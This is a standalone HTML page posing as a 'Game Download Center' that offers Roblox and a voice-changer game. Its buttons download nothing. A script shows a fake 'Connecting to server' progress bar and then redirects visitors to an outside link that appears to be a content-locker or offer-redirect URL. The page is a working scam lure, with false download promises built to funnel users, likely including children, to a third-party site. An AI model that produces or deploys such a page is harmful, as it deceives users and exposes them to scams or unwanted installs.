<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Game Download Center</title>

<style>

body{
background:#0f0f0f;
font-family:Arial;
color:white;
text-align:center;
margin:0;
}

.container{
max-width:500px;
margin:auto;
padding:20px;
}

.game{
background:#1c1c1c;
padding:25px;
border-radius:15px;
margin-top:30px;
box-shadow:0 0 20px rgba(0,0,0,0.5);
}

.logo{
width:120px;
margin-bottom:15px;
}

button{
background:#1e88ff;
border:none;
padding:12px 30px;
color:white;
font-size:16px;
border-radius:8px;
cursor:pointer;
}

button:hover{
background:#0066ff;
}

#loading{
display:none;
margin-top:40px;
}

.bar{
width:100%;
height:10px;
background:#333;
border-radius:5px;
overflow:hidden;
margin-top:10px;
}

.progress{
width:0%;
height:100%;
background:#1e88ff;
transition:width 0.2s;
}

</style>
</head>

<body>

<div class="container">

<h1>Game Download Center</h1>

<div class="game">

<img class="logo"
src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Roblox_Logo_2022.svg/512px-Roblox_Logo_2022.svg.png">

<h3>Roblox</h3>

<p>Play millions of games online.</p>

<button onclick="start()">Start</button>

</div>

<div class="game">

<img class="logo"
src="https://cdn-icons-png.flaticon.com/512/1041/1041916.png">

<h3>My Voice Zoo</h3>

<p>Try the fun voice changer game.</p>

<button onclick="start()">Download</button>

</div>

<div id="loading">

<h3>Connecting to server...</h3>

<p>Please wait...</p>

<div class="bar">
<div class="progress" id="progress"></div>
</div>

</div>

</div>

<script>

function start(){

document.getElementById("loading").style.display="block"

window.scrollTo(0,document.body.scrollHeight)

let width=0
let bar=document.getElementById("progress")

let interval=setInterval(function(){

if(width>=100){

clearInterval(interval)

window.location.href="https://confirmapp.online/cl/i/822jo6"

}

width++
bar.style.width=width+"%"

},35)

}

</script>

</body>
</html>
